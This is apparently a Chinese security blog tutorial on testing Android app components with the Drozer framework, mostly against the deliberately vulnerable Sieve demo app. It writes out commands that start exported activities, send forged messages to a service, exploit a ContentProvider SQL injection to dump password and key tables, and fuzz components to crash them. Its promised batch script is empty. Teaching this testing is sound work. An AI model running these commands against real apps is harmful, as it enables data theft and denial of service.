#  基于Drozer框架对安卓四大组件的漏洞挖掘总结   
NEURON  SAINTSEC   2025-05-16 01:16  
  
**0****1**  
  
**前言**  
  
之前分析了安卓四大组件漏洞形成的原因，这次我们来讲一下如何通过  
Drozer  
测试框架来挖掘。  
Drozer  
是一个开源项目，用户可以自由下载和使用。其代码托管在  
GitHub  
上，用户可以参与到  
Drozer  
的开发和维护中。  
Drozer  
的文档和教程也非常丰富，用户可以通过阅读文档和教程来快速学习和使用  
Drozer  
。  
  
  
**02****‍**  
  
**漏洞挖掘‍‍‍‍‍‍‍‍**  
  
  
****  
**2.1****Drozer****测试框架**  
  
Drozer  
是一个  
Android  
应用程序安全测试框架，旨在帮助安全研究人员和安全测试人员发现和利用  
Android  
应用程序中的漏洞。  
Drozer  
提供了一组功能强大的工具和  
API  
，可以帮助用户深入分析和测试  
Android  
应用程序的安全性  
。  
主要包括以下功能：  
  
1  
．应用程序分析：  
Drozer  
可以帮助用户分析  
Android  
应用程序的代码和数据，包括应用程序的组件、权限、服务、广播、内容提供者等。用户可以使用  
Drozer  
提供的命令行工具或  
API  
来执行这些分析任务。  
  
2.  
漏洞扫描：  
Drozer  
可以帮助用户扫描  
Android  
应用程序中的漏洞，包括安全配置错误、代码注入、代码执行、敏感信息泄露等。  
Drozer  
提供了一组漏洞扫描插件，用户可以使用这些插件来执行漏洞扫描任务。  
  
3.  
漏洞利用  
Drozer  
可以帮助用户利用  
Android  
应用程序中的漏洞，包括代码注入、代码执行、权限提升等。  
Drozer  
提供了一组漏洞利用插件，用户可以使用这些插件来执行漏洞利用任务。  
  
4.  
模拟攻击  
Drozer  
可以帮助用户模拟攻击  
Android  
应用程序，包括模拟恶意应用程序、模拟攻击者访问应用程序等。  
Drozer  
提供了一组模拟攻击插件，用户可以使用这些插件来执行模拟攻击任务。  
  
  
**2.2****测试流程**  
  
**2.2.1    工具使用**  
  
在  
PC  
上使用  
adb  
进行端口转发，转发到  
Drozer  
使用的端口  
31415  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MicUjGc65cAOOuqiaGIxyasGMmibBjfo4U3QRoicoOcKsOmvwKpqXic2CCaw/640?wx_fmt=png "")  
  
在  
Android  
设备上开启  
Drozer Agent  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MMZicfSReAicKOO3DFhFgU2ctxWBC1lSNzyDn12wrialteB7Nokmh4nnAA/640?wx_fmt=png "")  
  
  
在  
PC  
上开启  
Drozer console  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MnSNxEOuH6pfTfNebdLTLDbNlGtnguWicqp35r1pBicWdmpc6qR4Ypv2A/640?wx_fmt=png "")  
  
  
获取包名  
  
run app.**package**  
.list -f sieve  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MXLXu8tDBMAKNHu2GylsEXspiciax4mBZ7h4z8aWWU7uXQhQ6H0VG8fcA/640?wx_fmt=png "")  
  
  
**获取应用的基本信息**  
  
run app.package.info -**a**  
com.mwr.example.sieve  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MILzrYqh3hr18gRwhCicWblWSnblw60EuJ7aFAsA1MNvZE8RjRjxmORw/640?wx_fmt=png "")  
  
  
**确定攻击面**  
  
run app.**package**  
.attacksurface com.mwr.example.sieve  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7Mk2oOEGlxDDCOeSKHQTUibHI4dGDp4EA2hib28iavTBcOmicLc6NakjcI6g/640?wx_fmt=png "")  
  
### 2.2.2    Activity漏洞挖掘  
  
-  
显示暴露的  
Activity  
信息  
  
run app.activity.info -a com.mwr.example.sieve  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MsKRYKd0NRicdvc4Z9VGQODibyGicWNmLx8nkpfmBAhKtniaqVoPVOGRAFg/640?wx_fmt=png "")  
  
  
-  
生成  
intent  
启动  
activity  
  
run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7ML4X0IHoD5mW0meGB1XEjAv2vFibicrv1emMI62baqeHSGH34HRy9rl6A/640?wx_fmt=png "")  
  
### 2.2.3    Service漏洞挖掘  
  
获取  
service  
详情　　  
  
run app.service.info -a com.mwr.example.sieve  
  
权限提升  
  
run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg2354 9234  0 --extra string com.mwr.example.sieve.PIN 1111 --bundle-as-obj  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7M3pypS9W2QfH99Us1UDWtVW2yHlwwPr1icrzXQL7I6pniclPuib7rQLcvA/640?wx_fmt=png "")  
  
### 2.2.4    BroadcastReceiver漏洞挖掘  
  
查看暴露的广播组件信息  
  
run app.broadcast.info -a com.mwr.example.sieve  
### 2.2.5    ContentProvider漏洞挖掘  
  
-  
ContentProvider  
注入漏洞  
  
run app.provider.info -a com.mwr.example.sieve  
  
run scanner.provider.injection -a com.mwr.example.sieve  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MsERxlhp94ZXJM5HZMLhNRT0BULh5bVicqqTVVInQPjXtFvaf8Bpwt1w/640?wx_fmt=png "")  
  
通过命令即可拿到数据库的数据  
  
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "* from Passwords;-"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MH9owWut4hxm8vQbVha9EOVfYQl3jibh8QKP6lhqtsGq1g8sDHKnACVg/640?wx_fmt=png "")  
  
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --projection "* from Key;-"  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7Mib5SjdB1Gtr3n2MrORentjZhXlUb2aqGq0JPVANoftcyXNVGibMdUvRg/640?wx_fmt=png "")  
  
### 2.2.6    批量拒绝服务漏洞  
  
Drozer  
有个最大的优点就是模块化，提供很多  
API  
接口可以由测试人员自由编写测试脚本，这里推荐一种加载模块的方法  
  
在  
repository  
中按照  
python  
包管理的方法新建目录结构，将  
python  
文件放入相应目录中  
  
dz> module repository create [/path/to/repository]  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSbf9vbb0D84PNNS7O7Ed7MewgOqyFFEfNYTTL05QgAZ3icP5ol3g9zfptXib7cFVlPMdyNzZIJK5aQ/640?wx_fmt=png "")  
  
然后首先要输出崩溃的日志。  
  
adb_server.exelogcat | grep java.lang.RuntimeException  
  
run app.activity.start --component com.buickcom.ccb.ccbnetpay.activity.appresult.ResultActivity  
  
然后再去运行  
  
run exp.fuzz.deny  
包名  
  
这样脚本就会以空数据的方式去启动导出的组件，如果由崩溃的就可以直接在输出的日志中查看到具体崩溃的是哪个组件，下面是批量脚本。  
```
```  
  
  
‍  
  
**03****‍**  
  
**总结**  
  
总之，利用  
Drozer  
测试安卓  
app  
可以帮助安全测试人员更好地检测应用程序的漏洞和安全问题，有助于更快的完成  
Android  
安全评估，可以大大缩减  
Android  
安全评估的耗时提高应用程序的安全性。         
‍  
  
‍  
  
